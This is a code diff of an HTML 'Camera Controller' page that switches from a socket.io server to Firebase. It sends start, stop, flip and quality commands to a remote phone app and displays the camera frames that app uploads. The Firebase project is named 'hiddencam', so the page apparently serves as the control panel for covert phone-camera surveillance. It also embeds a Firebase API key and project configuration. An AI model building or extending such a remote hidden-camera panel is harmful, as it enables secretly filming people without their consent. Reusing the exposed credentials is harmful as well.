@@ -3,8 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Camera Stream</title>
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <title>Camera Controller</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
     <style>
         * {
             margin: 0;
@@ -13,47 +15,100 @@
         }
         
         body {
-            background: #000000;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #000000, #1a1a2e);
             min-height: 100vh;
+            font-family: system-ui, -apple-system, sans-serif;
+            padding: 20px;
         }
         
-        /* Header with status */
-        .status-bar {
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: white;
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+        
+        .header p {
+            color: #888;
+            font-size: 14px;
+        }
+        
+        .status-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .device-status {
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            padding: 12px 16px;
-            background: transparent;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .status-dot.online {
+            background: #22c55e;
+            box-shadow: 0 0 8px #22c55e;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .status-dot.offline {
+            background: #ef4444;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .device-name {
             color: white;
             font-size: 14px;
         }
         
-        .time {
-            font-weight: 500;
+        .device-id {
+            color: #888;
+            font-size: 11px;
+            font-family: monospace;
+            margin-top: 5px;
         }
         
-        .battery {
-            display: flex;
-            align-items: center;
-            gap: 4px;
+        .stream-card {
+            background: rgba(0,0,0,0.6);
+            border-radius: 20px;
+            padding: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.15);
+            margin-bottom: 20px;
         }
         
-        /* Main Container */
-        .container {
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-        }
-        
-        /* Video Preview Area */
         .video-container {
-            flex: 1;
             background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
+            border-radius: 16px;
+            overflow: hidden;
+            aspect-ratio: 16/9;
+            border: 2px solid #333;
+            margin-bottom: 15px;
         }
         
         #streamImage {
@@ -62,206 +117,196 @@
             object-fit: cover;
         }
         
-        /* Top Overlay Controls */
-        .top-controls {
-            position: absolute;
-            top: 60px;
-            left: 0;
-            right: 0;
+        .stream-info {
             display: flex;
             justify-content: space-between;
-            padding: 0 20px;
-            z-index: 10;
+            color: #aaa;
+            font-size: 13px;
         }
         
-        .quality-badge {
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(10px);
-            padding: 8px 16px;
-            border-radius: 30px;
-            color: white;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .back-btn {
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(10px);
-            width: 40px;
-            height: 40px;
-            border-radius: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 20px;
-            cursor: pointer;
-        }
-        
-        /* Bottom Controls */
-        .bottom-controls {
-            position: absolute;
-            bottom: 30px;
-            left: 0;
-            right: 0;
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            padding: 20px;
-            z-index: 10;
-        }
-        
-        .control-btn {
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(20px);
-            width: 70px;
-            height: 70px;
-            border-radius: 70px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            cursor: pointer;
-            transition: 0.2s;
-            border: 1px solid rgba(255,255,255,0.3);
-        }
-        
-        .control-btn:active {
-            transform: scale(0.95);
-        }
-        
-        .control-btn.record {
-            background: #22c55e;
-            border: none;
-            box-shadow: 0 0 20px rgba(34,197,94,0.5);
-        }
-        
-        .control-btn.stop {
-            background: #ef4444;
-            border: none;
-        }
-        
-        .control-btn.flip {
-            background: rgba(0,0,0,0.6);
-        }
-        
-        /* Status Text */
-        .status-text {
-            position: absolute;
-            bottom: 120px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            color: white;
-            font-size: 12px;
-            background: rgba(0,0,0,0.5);
-            padding: 6px;
-            backdrop-filter: blur(5px);
-        }
-        
-        /* Quality Panel */
-        .quality-panel {
-            position: absolute;
-            bottom: 130px;
-            right: 20px;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(10px);
-            border-radius: 30px;
-            padding: 8px;
-            display: flex;
-            gap: 8px;
-            z-index: 10;
-        }
-        
-        .quality-option {
-            padding: 6px 14px;
-            border-radius: 25px;
-            color: white;
-            font-size: 12px;
-            cursor: pointer;
-            background: rgba(255,255,255,0.1);
-        }
-        
-        .quality-option.active {
-            background: #22c55e;
-        }
-        
-        /* FPS Counter */
-        .fps-counter {
-            position: absolute;
-            top: 60px;
-            right: 20px;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(10px);
-            padding: 6px 12px;
-            border-radius: 20px;
+        .fps {
             color: #22c55e;
             font-family: monospace;
-            font-size: 14px;
+            font-size: 16px;
+        }
+        
+        .control-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .control-title {
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
             font-weight: bold;
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        button:active {
+            transform: scale(0.96);
+        }
+        
+        .btn-start {
+            background: #22c55e;
+            color: white;
+            box-shadow: 0 0 10px rgba(34,197,94,0.3);
+        }
+        
+        .btn-stop {
+            background: #ef4444;
+            color: white;
+            box-shadow: 0 0 10px rgba(239,68,68,0.3);
+        }
+        
+        .btn-flip {
+            background: #3b82f6;
+            color: white;
+        }
+        
+        .quality-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .quality-title {
+            color: white;
+            margin-bottom: 10px;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .quality-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .quality-btn {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 8px 20px;
+            border-radius: 30px;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        
+        .quality-btn.active {
+            background: #22c55e;
+            border-color: #22c55e;
+        }
+        
+        .footer {
+            text-align: center;
+            color: #555;
+            font-size: 11px;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Video Area -->
-        <div class="video-container">
-            <img id="streamImage" src="">
-            
-            <!-- Top Controls -->
-            <div class="top-controls">
-                <div class="back-btn" onclick="history.back()">←</div>
-                <div class="quality-badge" id="qualityBadge">240p</div>
+        <div class="header">
+            <h1>📷 Camera Controller</h1>
+            <p>Firebase Controlled Camera</p>
+        </div>
+        
+        <div class="status-card">
+            <div class="device-status">
+                <div class="status-dot offline" id="statusDot"></div>
+                <span class="device-name" id="deviceStatus">Device Offline</span>
             </div>
-            
-            <!-- FPS Counter -->
-            <div class="fps-counter" id="fpsCounter">0 FPS</div>
-            
-            <!-- Quality Panel -->
-            <div class="quality-panel" id="qualityPanel">
-                <div class="quality-option" data-quality="140p">140p</div>
-                <div class="quality-option active" data-quality="240p">240p</div>
-                <div class="quality-option" data-quality="360p">360p</div>
+            <div class="device-id" id="deviceId">No device connected</div>
+        </div>
+        
+        <div class="stream-card">
+            <div class="video-container">
+                <img id="streamImage" src="">
             </div>
-            
-            <!-- Status Text -->
-            <div class="status-text" id="statusText">● Ready</div>
-            
-            <!-- Bottom Controls -->
-            <div class="bottom-controls">
-                <div class="control-btn flip" id="flipBtn">🔄</div>
-                <div class="control-btn record" id="startBtn">▶</div>
-                <div class="control-btn stop" id="stopBtn">⏹</div>
+            <div class="stream-info">
+                <span>📡 Live Feed</span>
+                <span class="fps">⚡ <span id="fpsValue">0</span> FPS</span>
             </div>
+        </div>
+        
+        <div class="quality-card">
+            <div class="quality-title">🎯 Stream Quality</div>
+            <div class="quality-buttons" id="qualityButtons">
+                <button class="quality-btn" data-quality="140p">140p</button>
+                <button class="quality-btn active" data-quality="240p">240p</button>
+                <button class="quality-btn" data-quality="360p">360p</button>
+            </div>
+        </div>
+        
+        <div class="control-card">
+            <div class="control-title">🎮 Camera Control</div>
+            <div class="button-group">
+                <button class="btn-start" id="startBtn">▶ START</button>
+                <button class="btn-stop" id="stopBtn">⏹ STOP</button>
+                <button class="btn-flip" id="flipBtn">🔄 Flip Camera</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            🔒 Firebase Realtime DB | 🎯 Real-time Control
         </div>
     </div>
     
     <script>
-        // 🔴🔴🔴 REPLIT SERVER URL 🔴🔴🔴
-        const SERVER_URL = "https://afd72d85-3130-4283-a166-eff5f9d20ecc-00-38ph50wurdt2w.pike.replit.dev";
+        // 🔴🔴🔴 FIREBASE CONFIG (APNI DALO) 🔴🔴🔴
+        const firebaseConfig = {
+            apiKey: "AIzaSyCcstwitNGxv5osXZ9AQ0a0PDn7j-MTv-0",
+            authDomain: "hiddencam-62e2d.firebaseapp.com",
+            databaseURL: "https://hiddencam-62e2d-default-rtdb.firebaseio.com",
+            projectId: "hiddencam-62e2d",
+            storageBucket: "hiddencam-62e2d.firebasestorage.app",
+            messagingSenderId: "931792860891",
+            appId: "1:931792860891:android:602d1099f876f4688d7efe"
+        };
         
-        const socket = io(SERVER_URL, {
-            transports: ['websocket', 'polling'],
-            reconnection: true
-        });
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
         
-        // Elements
+        // Device ID (fixed for web control)
+        const deviceId = "web_controller";
+        
+        // DOM Elements
+        const statusDot = document.getElementById('statusDot');
+        const deviceStatus = document.getElementById('deviceStatus');
+        const deviceIdSpan = document.getElementById('deviceId');
         const streamImage = document.getElementById('streamImage');
-        const fpsCounter = document.getElementById('fpsCounter');
-        const statusText = document.getElementById('statusText');
-        const qualityBadge = document.getElementById('qualityBadge');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const flipBtn = document.getElementById('flipBtn');
+        const fpsSpan = document.getElementById('fpsValue');
         
         let fps = 0;
         let lastFpsUpdate = Date.now();
         
-        // FPS Counter
         function updateFPS() {
             const now = Date.now();
             if (now - lastFpsUpdate >= 1000) {
-                fpsCounter.innerText = fps + ' FPS';
+                fpsSpan.innerText = fps;
                 fps = 0;
                 lastFpsUpdate = now;
             }
@@ -269,88 +314,69 @@
         }
         updateFPS();
         
-        // Quality Selection
-        document.querySelectorAll('.quality-option').forEach(btn => {
+        // 🔴 Send Command to Firebase
+        function sendCommand(command, value) {
+            const commandRef = database.ref('commands/' + deviceId);
+            commandRef.set({
+                action: command,
+                value: value || null,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+            console.log('Command sent:', command, value);
+        }
+        
+        // 🔴 Listen for Frames from APK
+        database.ref('frames/' + deviceId).on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.frame) {
+                streamImage.src = data.frame;
+                fps++;
+                deviceStatus.innerText = 'Streaming Live';
+                deviceStatus.style.color = '#22c55e';
+                statusDot.className = 'status-dot online';
+            }
+        });
+        
+        // 🔴 Listen for Device Status
+        database.ref('devices/' + deviceId + '/status').on('value', (snapshot) => {
+            const status = snapshot.val();
+            if (status === 'online') {
+                statusDot.className = 'status-dot online';
+                deviceStatus.innerText = 'Device Online';
+                deviceStatus.style.color = '#22c55e';
+            } else if (status === 'offline') {
+                statusDot.className = 'status-dot offline';
+                deviceStatus.innerText = 'Device Offline';
+                deviceStatus.style.color = '#ef4444';
+            }
+        });
+        
+        database.ref('devices/' + deviceId + '/deviceId').on('value', (snapshot) => {
+            const id = snapshot.val();
+            if (id) {
+                deviceIdSpan.innerText = '📱 ' + id.substring(0, 25) + '...';
+            }
+        });
+        
+        // 🔴 Control Buttons
+        document.getElementById('startBtn').onclick = () => sendCommand('start');
+        document.getElementById('stopBtn').onclick = () => sendCommand('stop');
+        document.getElementById('flipBtn').onclick = () => sendCommand('flip');
+        
+        // 🔴 Quality Buttons
+        document.querySelectorAll('.quality-btn').forEach(btn => {
             btn.onclick = () => {
-                document.querySelectorAll('.quality-option').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
                 btn.classList.add('active');
                 const quality = btn.dataset.quality;
-                qualityBadge.innerText = quality;
-                socket.emit('set-quality', quality);
-                statusText.innerText = '● Quality: ' + quality;
-                setTimeout(() => {
-                    if (statusText.innerText.includes('Quality')) {
-                        statusText.innerText = '● Ready';
-                    }
-                }, 1500);
+                sendCommand('quality', quality);
             };
         });
         
-        // Control Buttons
-        startBtn.onclick = () => {
-            socket.emit('command', 'start');
-            statusText.innerText = '● Starting...';
-            startBtn.style.opacity = '0.7';
-            setTimeout(() => {
-                startBtn.style.opacity = '1';
-            }, 500);
-        };
-        
-        stopBtn.onclick = () => {
-            socket.emit('command', 'stop');
-            statusText.innerText = '● Stopped';
-            stopBtn.style.opacity = '0.7';
-            setTimeout(() => {
-                stopBtn.style.opacity = '1';
-            }, 500);
-        };
-        
-        flipBtn.onclick = () => {
-            socket.emit('flip-camera');
-            statusText.innerText = '● Flipping camera...';
-            setTimeout(() => {
-                if (statusText.innerText.includes('Flipping')) {
-                    statusText.innerText = '● Ready';
-                }
-            }, 1500);
-        };
-        
-        // Socket Events
-        socket.on('connect', () => {
-            console.log('Connected');
-            statusText.innerText = '● Connected';
-            setTimeout(() => {
-                if (statusText.innerText === '● Connected') {
-                    statusText.innerText = '● Ready';
-                }
-            }, 2000);
-        });
-        
-        socket.on('disconnect', () => {
-            statusText.innerText = '● Disconnected';
-            statusText.style.color = '#ef4444';
-        });
-        
-        socket.on('frame', (data) => {
-            if (data) {
-                streamImage.src = data;
-                fps++;
-                statusText.innerText = '● Live';
-                statusText.style.color = '#22c55e';
-                setTimeout(() => {
-                    if (statusText.innerText === '● Live') {
-                        statusText.innerText = '● Ready';
-                        statusText.style.color = 'white';
-                    }
-                }, 1000);
-            }
-        });
-        
-        socket.on('deviceStatus', (data) => {
-            if (data && data.status === 'online') {
-                statusText.innerText = '● Device Online';
-            }
-        });
+        // 🔴 Send heartbeat to show web is active
+        setInterval(() => {
+            database.ref('web_control/active').set(true);
+        }, 30000);
     </script>
 </body>
 </html>
